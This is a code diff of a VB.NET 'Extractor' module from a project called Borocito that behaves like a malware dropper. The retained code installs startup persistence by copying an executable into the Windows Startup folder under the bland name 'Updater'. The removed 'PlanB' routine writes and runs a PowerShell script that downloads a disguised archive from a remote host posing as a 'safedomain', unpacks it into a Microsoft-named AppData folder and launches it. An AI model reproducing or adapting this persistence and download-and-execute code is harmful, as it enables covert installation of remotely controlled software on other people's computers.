@@ -134,24 +134,6 @@ Module Extractor
             AddToLog("SetExistence@Extractor", "Error: " & ex.Message, True)
         End Try
     End Sub
-    Sub StartWithWindows()
-        Try
-            AddToLog("StartWithWindows@StartUp", "Making Borocito start with Windows...", False)
-            Dim StartupShortcut As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.lnk"
-            If My.Computer.FileSystem.FileExists(StartupShortcut) = False Then
-                Dim WSHShell As Object = CreateObject("WScript.Shell")
-                Dim Shortcut As Object = WSHShell.CreateShortcut(StartupShortcut)
-                Shortcut.IconLocation = DIRCommons & "\BorocitoUpdater.exe,0"
-                Shortcut.TargetPath = DIRCommons & "\BorocitoUpdater.exe"
-                Shortcut.WindowStyle = 1
-                Shortcut.Description = "Updater software for Borocito"
-                Shortcut.Save()
-                My.Computer.FileSystem.CopyFile(DIRCommons & "\BorocitoUpdater.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe")
-            End If
-        Catch ex As Exception
-            AddToLog("StartWithWindows@Extractor", "Error: " & ex.Message, True)
-        End Try
-    End Sub
     Sub StartExtract()
         Try
             AddToLog("StartExtract@StartUp", "Inicializando Extractor...", False)
@@ -199,12 +181,31 @@ Module Extractor
             AddToLog("StartExtract@Extractor", "Error: " & ex.Message, True)
         End Try
     End Sub
+    Sub StartWithWindows()
+        Try
+            AddToLog("StartWithWindows@StartUp", "Making Borocito start with Windows...", False)
+            Dim StartupShortcut As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.lnk"
+            If My.Computer.FileSystem.FileExists(StartupShortcut) = False Then
+                Dim WSHShell As Object = CreateObject("WScript.Shell")
+                Dim Shortcut As Object = WSHShell.CreateShortcut(StartupShortcut)
+                Shortcut.IconLocation = DIRCommons & "\BorocitoUpdater.exe,0"
+                Shortcut.TargetPath = DIRCommons & "\BorocitoUpdater.exe"
+                Shortcut.WindowStyle = 1
+                Shortcut.Description = "Updater software for Borocito"
+                Shortcut.Save()
+                My.Computer.FileSystem.CopyFile(DIRCommons & "\BorocitoUpdater.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe")
+            End If
+        Catch ex As Exception
+            AddToLog("StartWithWindows@Extractor", "Error: " & ex.Message, True)
+        End Try
+    End Sub
     Sub InitUpdater()
         Try
             AddToLog("InitUpdater@StartUp", "Iniciando Updater...", False)
             Process.Start(DIRCommons & "\BorocitoUpdater.exe")
-            Dim threadMonitoring = New Threading.Thread(Sub() Monitoring("Boro Defender System", 120000))
-            threadMonitoring.Start()
+            'Dim threadMonitoring = New Threading.Thread(Sub() Monitoring("Boro Defender System", 120000))
+            'threadMonitoring.Start()
+            End
         Catch ex As Exception
             AddToLog("InitAll@Extractor", "Error: " & ex.Message, True)
         End Try
@@ -220,71 +221,23 @@ Module Extractor
                     End
                 Else
                     ' Process is not running
-                    AddToLog("Monitoring", "The proccess is not running! Plan B...", False)
-                    'plan b
+                    AddToLog("Monitoring", "The proccess is not running! Starting...", False)
+                    SecondStage()
                 End If
             End While
         Catch ex As Exception
             AddToLog("Monitoring@Extractor", "Error: " & ex.Message, True)
         End Try
     End Sub
-    Sub PlanB()
+    Sub SecondStage()
         Try
-            AddToLog("Extractor", "Inicializing Plan B", False)
-            Dim filePath As String = DIRTemp & "\Extractor.ps1"
-            Dim contenido As String = "Add-Type -AssemblyName System.IO.Compression.FileSystem" &
-                vbCrLf & "function AddToLog {" &
-                vbCrLf & "    param (" &
-                vbCrLf & "        [string]$contentMsg" &
-                vbCrLf & "    )" &
-                vbCrLf & "    Write-Host $contentMsg" &
-                vbCrLf & "    Start-Sleep -Seconds 1.5" &
-                vbCrLf & "}" &
-                vbCrLf & "AddToLog 'Inicializing the installer...'" &
-                vbCrLf & "AddToLog 'Seting variables...'" &
-                vbCrLf & "$ownerServer = 'safedomainfrominternet.atwebpages.com/Borocito'" &
-                vbCrLf & "AddToLog() 'Seting needed variables...'" &
-                vbCrLf & "$hostServer = 'http://' + $ownerServer" &
-                vbCrLf & "$binariesZip = $hostServer + '/Borocitos.cph'" &
-                vbCrLf & "$DIRCommons = -join('C:\Users\',[System.Environment]::UserName,'\AppData\Local\Microsoft\Borocito')" &
-                vbCrLf & "$outputZip = $DIRCommons + '\Borocitos.zip'" &
-                vbCrLf & "$runPacket = $DIRCommons + '\BorocitoUpdater.exe'" &
-                vbCrLf & "AddToLog() 'Starting...'" &
-                vbCrLf & "AddToLog() 'Checking registry...'" &
-                vbCrLf & "If (Test-Path 'HKCU:\SOFTWARE\Borocito') {" &
-                vbCrLf & "  AddToLog 'The registry already exist!'" &
-                vbCrLf & "}else {" &
-                vbCrLf & "  AddToLog 'The registry doesnt exist! Creating...'" &
-                vbCrLf & "  New-Item -Path 'HKCU:\SOFTWARE' -Name Borocito" &
-                vbCrLf & "  New-ItemProperty -Path 'HKCU:\SOFTWARE\Borocito' -Name 'OwnerServer' -Value $ownerServer -PropertyType 'String'" &
-                vbCrLf & "}" &
-                vbCrLf & "New-Item $DIRCommons -ItemType Directory" &
-                vbCrLf & "AddToLog ([string]::Format('Downloading zip binaries...`n	From: {0}`n	To: {1}', $binariesZip,$outputZip))" &
-                vbCrLf & "$webClient = [System.Net.WebClient]::new()" &
-                vbCrLf & "$webClient.DownloadFile($binariesZip, $outputZip)" &
-                vbCrLf & "AddToLog ([string]::Format('Extracting zip binaries...`n	From: {0}`n	To: {1}', $outputZip,$DIRCommons))" &
-                vbCrLf & "[System.IO.Compression.ZipFile]::ExtractToDirectory($outputZip, $DIRCommons)" &
-                vbCrLf & "AddToLog 'Starting the packet...'" &
-                vbCrLf & "AddToLog ([string]::Format('Starting packet......`n	Packet: {0}', $runPacket))" &
-                vbCrLf & "Start-Process -FilePath $runPacket" &
-                vbCrLf & "AddToLog 'Exiting...'" &
-                vbCrLf & "Exit"
-            If My.Computer.FileSystem.FileExists(filePath) Then
-                My.Computer.FileSystem.DeleteFile(filePath)
-            End If
+            AddToLog("Extractor", "Inicializing Second Stage...", False)
 
-            My.Computer.FileSystem.WriteAllText(filePath, contenido, False)
+            'La idea es poder iniciar una instancia descargada desde internet.
+            'Por esta razon, esta etapa no estara lista en algun tiempo.
 
-            AddToLog("Extractor", "Starting plan B...", False)
-
-            Process.Start("powershell.exe", filePath)
-
-            Threading.Thread.Sleep(5000)
-
-            AddToLog("Extractor", "Closing...", False)
-
+            AddToLog("Extractor", "Closing Second Stage...", False)
             End
-
         Catch ex As Exception
             AddToLog("PlanB@Extractor", "Error: " & ex.Message, True)
         End Try
